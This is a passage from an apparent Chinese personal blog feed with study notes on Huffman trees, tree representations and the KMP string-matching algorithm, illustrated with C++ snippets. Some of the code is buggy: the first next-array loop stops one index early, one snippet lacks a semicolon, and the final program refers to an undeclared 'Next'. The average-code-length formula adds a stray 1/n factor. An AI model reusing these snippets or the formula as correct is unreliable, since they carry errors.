class="token operator">>></span> freqList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    priority_queue<span class="token operator">&lt;</span>Node<span class="token operator">*</span><span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>Node<span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">,</span> Compare<span class="token operator">></span> pq<span class="token punctuation">;</span>    <span class="token comment">// 初始化优先队列（最小堆）</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span><span class="token operator">&amp;</span> it <span class="token operator">:</span> freqList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">Node</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span>first<span class="token punctuation">,</span> it<span class="token punctuation">.</span>second<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 构建哈夫曼树</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>pq<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        Node<span class="token operator">*</span> left <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> pq<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Node<span class="token operator">*</span> right <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> pq<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 创建新节点（合并两个最小节点）</span>        Node<span class="token operator">*</span> parent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">Node</span><span class="token punctuation">(</span><span class="token char">'\0'</span><span class="token punctuation">,</span> left<span class="token operator">-></span>freq <span class="token operator">+</span> right<span class="token operator">-></span>freq<span class="token punctuation">)</span><span class="token punctuation">;</span>        parent<span class="token operator">-></span>left <span class="token operator">=</span> left<span class="token punctuation">;</span>        parent<span class="token operator">-></span>right <span class="token operator">=</span> right<span class="token punctuation">;</span>        <span class="token comment">// 插入新节点到优先队列</span>        pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 最终根节点就是哈夫曼树的根</span>    <span class="token keyword">return</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="哈夫曼树应用">哈夫曼树应用</h3><h4 id="哈夫曼编码">哈夫曼编码</h4><p>将文本字符串转化为二进制字符串编码。<br>在一般方案里，我们使用定长码，规定ascll码中的每个字符的编号。但我们这样的话空间花销大。所以我们可以使用不定长码来提高效率。</p><h5 id="不定长码">不定长码</h5><p>使用频率高的字符采用短编码，频率低的字符采用长编码。</p><h6 id="前缀码">前缀码</h6><p>一种常用的不定长码，每个字母的编码都不是其他字母编码的前缀。<br>（这样的编码可以避免读取的歧义，比如1101，可以看作1 101，也可以看作11 01，这样的歧义需要避免。）<br><strong>构造示例</strong>：<br><img src="/images/%E6%A0%91/a0149c452deca71987867fcefd399cd.jpg" alt=""><br>其实还是很有意思的。我们可以算编码长度的加权平均数，即平均码长。<br>P为出现频率，W为码长。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi>W</mi><mo>ˉ</mo></mover><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>W</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\bar{W}= \frac{1}{n}\sum_{i=1}^{n} (P(i)*W(i))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8201em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">))</span></span></span></span></span></p><h2 id="树表示法">树表示法</h2><h3 id="父指针表示法">父指针表示法</h3><p>保存父节点的索引。<br><img src="/images/%E6%A0%91/fd75aeae4ccae8845829ade83c135d7.jpg" alt=""><br>一般用于实现并查集，时间复杂度为O(H)，H为树的高度。</p><h3 id="孩子表示法">孩子表示法</h3><p>存储的是结点所有的孩子，是一个子节点链表，存储的是头指针。<br>各个子节点按从左向右的顺序排列。<br><img src="/images/%E6%A0%91/6001222e3a5c9ba14b6cdd93fe1530e.jpg" alt=""></p><h3 id="孩子兄弟表示法">孩子兄弟表示法</h3><p>常常使用<strong>二叉链表</strong>实现。每个节点存放它的第一个孩子和它的下一个兄弟的信息。<br>其实这个是最直观表现树结构的，兄弟信息代表所在层，孩子信息指向下一层。<br><img src="/images/%E6%A0%91/4fb17c82d96e8f451b97cf62689314e.jpg" alt=""></p><h2 id="树与二叉树与森林的转换">树与二叉树与森林的转换</h2><p><img src="/images/%E6%A0%91/Pasted%20image%2020250320090033.png" alt=""><br><img src="/images/%E6%A0%91/Pasted%20image%2020250320090130.png" alt=""></p><h2 id="树和森林的遍历">树和森林的遍历</h2><p>树和森林的遍历都只有前序遍历和后序遍历，<strong>无中序遍历</strong>。<br>规则相同，都是从左到右，依次遍历。<br><strong>树和森林</strong>的前序遍历与二叉树的前序遍历相同，<strong>后序遍历与二叉树的中序遍历相同</strong>，遍历时间复杂度与二叉树一样，都是O(n)。<br><img src="/images/%E6%A0%91/Pasted%20image%2020250320090331.png" alt=""><br><img src="/images/%E6%A0%91/Pasted%20image%2020250320090848.png" alt=""></p><hr>]]></content>
    
    
    <summary type="html">树的知识，懂了就写实现</summary>
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="编程" scheme="https://notes.moyuin.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>KMP算法</title>
    <link href="https://notes.moyuin.top/2025/03/19/xue-xi/shu-ju-jie-gou/kmp-suan-fa/"/>
    <id>https://notes.moyuin.top/2025/03/19/xue-xi/shu-ju-jie-gou/kmp-suan-fa/</id>
    <published>2025-03-19T14:34:44.000Z</published>
    <updated>2025-03-19T14:34:44.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>KMP算法</h1><p>我觉得还做不出题，想不通源码，先放着，wiki在这里：<a href="https://oi-wiki.org/string/kmp/">KMP算法</a></p><h2 id="基本概念-next数组">基本概念-next数组</h2><p>前缀：<strong>不含最后一个字符但包含第一个字符</strong>的 所有字串<br>后缀：<strong>不含第一个字符但包含最后一个字符</strong>，的 所有字串<br>前缀表 next ：代表 p[0:i] 即 p 的前 i+1 的字符，最长相等前后缀的长度,即<strong>前后缀的最长相同字串的长度</strong>。<br>如：<br><img src="/images/KMP%E7%AE%97%E6%B3%95/Pasted%20image%2020250318153118.png" alt=""><br>假设模式串 <code>P = &quot;ABABCABAA&quot;</code>，我们来计算 <code>next</code> 数组。</p><table><thead><tr><th>位置 <code>i</code></th><th>P[i]</th><th><code>P[0:i]</code> (子串)</th><th><code>next[i]</code></th><th>解释</th></tr></thead><tbody><tr><td>0</td><td>A</td><td>A</td><td>0</td><td>只有一个字符，无前后缀</td></tr><tr><td>1</td><td>B</td><td>AB</td><td>0</td><td>“A”（前缀） ≠ “B”（后缀）</td></tr><tr><td>2</td><td>A</td><td>ABA</td><td>1</td><td>“A”（前缀）= “A”（后缀），长度 1</td></tr><tr><td>3</td><td>B</td><td>ABAB</td><td>2</td><td>“AB”（前缀）= “AB”（后缀），长度 2</td></tr><tr><td>4</td><td>C</td><td>ABABC</td><td>0</td><td>“ABAB” ≠ “BABC”，无相等前后缀</td></tr><tr><td>5</td><td>A</td><td>ABABCA</td><td>1</td><td>“A”（前缀）= “A”（后缀），长度 1</td></tr><tr><td>6</td><td>B</td><td>ABABCAB</td><td>2</td><td>“AB”（前缀）= “AB”（后缀），长度 2</td></tr><tr><td>7</td><td>A</td><td>ABABCABA</td><td>3</td><td>“ABA”（前缀）= “ABA”（后缀），长度 3</td></tr><tr><td>8</td><td>A</td><td>ABABCABAA</td><td>1</td><td>“A”（前缀）= “A”（后缀），长度 1</td></tr></tbody></table><hr><p>如何构建呢？可以用一个循环，一个先计算前缀最长的长度，如果失配就重新移动字符匹配，保留最大值。<br>实现：<br>这里参考<a href="https://oi-wiki.org/string/kmp/#%E8%BF%87%E7%A8%8B_1">KMP算法next数组的优化过程</a></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> m<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">next</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">while</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> j<span class="token operator">=</span>next<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//失配，变成前一个匹配的位置。</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> j<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//配对，记录最长长度增加</span> next<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>j<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="KMP算法比较">KMP算法比较</h2><blockquote><p>给定一个文本 t 和一个字符串 s，我们尝试找到并展示 s 在 t 中的所有出现（occurrence）。<br>为了简便起见，我们用 n 表示字符串 s 的长度，用 m 表示文本 t 的长度。 我们构造一个字符串 s + # + t，其中 # 为一个既不出现在 s 中也不出现在 t 中的分隔符。接下 来计算该字符串的前缀函数。<br>现在考虑该前缀函数除去最开始 n + 1 个值（即属于字符串 s 和分 隔符的函数值）后其余函数值的意义。根据定义，next[i] 为右端点在 i 且同时为一个前缀的最长真 子串的长度，具体到我们的这种情况下，其值为与 s 的前缀相同且右端点位于 i 的最长子串的长 度。由于分隔符的存在，该长度不可能超过 n。而如果等式 next[i] = n 成立，则意味着 s 完整出现 在该位置（即其右端点位于位置 i）。注意该位置的下标是对字符串 s + # + t 而言的。 因此如果在某一位置 i 有 π[i] = n 成立，则字符串 s 在字符串 t 的 i − (n − 1) − (n + 1) = i − 2n 处出现。</p></blockquote><p>这是oier算法，其实我想不出来：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">search</span><span class="token punctuation">(</span>string t<span class="token punctuation">,</span>string s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>string cur <span class="token operator">=</span> s<span class="token operator">+</span><span class="token char">'#'</span><span class="token operator">+</span>t<span class="token punctuation">;</span><span class="token keyword">int</span> sz1<span class="token operator">=</span>t<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sz2<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> v<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>next<span class="token operator">=</span><span class="token function">Next</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>sz2<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>sz2<span class="token operator">+</span>sz1<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>sz2<span class="token punctuation">)</span> v<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>sz2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> v<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>KMP 算法的想法是：设法利用这个已知信息，不要把「搜索位置」移回已经比较过的位置，继续把它向后移，这样就提高了效率。<br>整个 KMP 算法中核心且难理解的是：</p><ol><li>部分匹配表代码实现，理解不了。原理理解了，但是代码想不明白</li><li>当不匹配的时候，不源字符串不回溯，只根据部分匹配表，移动子串的下标，让子串回溯。</li></ol><p>所以用简单的模拟的话，是这样的：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">KMP</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span>string p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sz1<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sz2<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>Next<span class="token operator">=</span><span class="token function">getnext</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>v<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>sz1<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            j<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            j<span class="token operator">=</span>Next<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            i<span class="token operator">--</span><span class="token punctuation">;</span><span class="token comment">//这里回溯j，是KMP算法的核心思路。</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>sz2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            v<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">-</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            j<span class="token operator">=</span>Next<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> v<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用 for 来一个一个匹配都懂，这里 KMP 算法核心就算那个回溯 j 和 push_back(i-j+1) 。<br>至于为什么需要回溯<code>j</code>，这是KMP算法的核心思想，让我解释一下：</p><h3 id="为什么要回溯j的原因">为什么要回溯j的原因</h3><p>当我们在匹配过程中遇到不匹配的字符时，传统的字符串匹配算法会将模式串完全重置到开始位置，然后主串向前移动一位重新开始匹配。这样会导致很多已经比较过的字符被重新比较，效率很低。</p><p>KMP算法的核心优化在于：<br><strong>利用已知信息</strong>：当匹配失败时，我们已经知道了模式串的前j个字符与主串的相应部分是匹配的。<br><strong>避免重复工作</strong>：我们不需要完全回到模式串的起始位置，而是可以跳到一个中间位置，这个位置由Next数组决定。<br><strong>Next数组的含义</strong>：<code>Next[j-1]</code>表示当模式串的第j个字符不匹配时，应该将模式串指针j回退到哪个位置，使得模式串的开头部分与主串的当前部分潜在地匹配。</p><p>简单来说，回溯<code>j</code>使我们可以：</p><ul><li>充分利用已经获得的部分匹配信息</li><li>避免从头开始重新匹配模式串</li><li>实现线性时间复杂度的字符串查找</li></ul><p>这种&quot;聪明地跳过&quot;是KMP算法比朴素字符串匹配算法更高效的关键原因。</p><h3 id="为什么要返回-i-j-1-的位置">为什么要返回 i-j+1 的位置</h3><p>关于为什么返回的是 <code>i-j+1</code> 而不是 <code>i</code> 的位置，这是因为在KMP算法中，当我们找到一个完全匹配时：</p><ol><li><code>i</code> 指向的是<strong>主串中</strong>刚刚匹配完成的<strong>最后一个字符的位置</strong>（当前循环结束后）。</li><li><code>j</code> 等于模式串的长度 <code>sz2</code>，表示模式串已经完全匹配，所以这里把<code>j</code> 写作sz2没有任何问题。</li><li>我们需要返回的是<strong>匹配开始的位置</strong>，而不是结束的位置。</li></ol><p>计算匹配开始位置的公式是：</p><pre class="line-numbers language-none"><code class="language-none">匹配起始位置 &#x3D; 当前位置(i) - 模式串长度(j) + 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体分析：</p><ul><li>假设主串是 “ABCDEF”，模式串是 “CDE”</li><li>当匹配完成时，<code>i</code> 指向 ‘E’（索引4），<code>j</code> 等于3</li><li>匹配的起始位置应该是 ‘C’（索引2）</li><li>索引计算：4 - 3 + 1 = 2</li></ul><p>在这里的for循环实现中，因为循环结束后 <code>i</code> 会自增，所以 <code>i</code> 实际上指向的是匹配完成后的下一个字符位置，为了避免这种错误运算，我们在每次错误匹配回溯的时候，都做一次 <strong>i–</strong>，让 <code>i</code> 回到匹配完成的最后一个位置。因此，正确的计算是 <code>i-j+1</code>。</p><h2 id="总体实现代码：">总体实现代码：</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">getnext</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//前缀</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">next</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//后缀</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">0</span><span class="token operator">&amp;&amp;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> j<span class="token operator">=</span>next<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> j<span class="token operator">++</span><span class="token punctuation">;</span>        next<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>j<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">KMP</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span>string p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sz1<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sz2<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>next<span class="token operator">=</span><span class="token function">getnext</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>v<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>sz1<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            j<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            j<span class="token operator">=</span>Next<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            i<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>sz2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            v<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">-</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            j<span class="token operator">=</span>Next<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> v<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    string s<span class="token punctuation">,</span>p<span class="token punctuation">;</span>    cin<span class="token operator">>></span>s<span class="token operator">>></span>p<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>ans<span class="token operator">=</span><span class="token function">KMP</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token 